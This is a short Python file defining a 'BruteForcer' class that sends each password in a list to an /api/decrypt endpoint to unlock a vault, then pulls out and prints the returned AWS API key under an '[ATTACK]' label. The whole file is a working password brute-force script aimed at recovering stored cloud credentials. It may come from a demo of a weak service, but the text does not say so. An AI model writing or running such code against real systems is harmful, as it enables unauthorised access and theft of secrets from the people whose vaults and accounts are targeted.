import requests 

class BruteForcer: 
    def __init__(self, api_url: str): 
        self.api_url = api_url 

    def attempt_passwords(self, vault: dict, password_list: list[str], vault_id: str | None = None): 
        results = [] 
    
        for password in password_list: 
            payload = {"password": password}
            if vault_id:
                payload["vault_id"] = vault_id
            else:
                payload["vault"] = vault

            response = requests.post(
                f"{self.api_url}/api/decrypt",
                json=payload,
            )
    
            data = response.json() 
    
            key = data["data"]["aws_api_key"] 
    
            print(f"[ATTACK] Tried: {password} → Got Key: {key}") 
    
            results.append({ 
                "password": password, 
                "key": key, 
                "status": data["status"] 
            }) 
    
        return results 
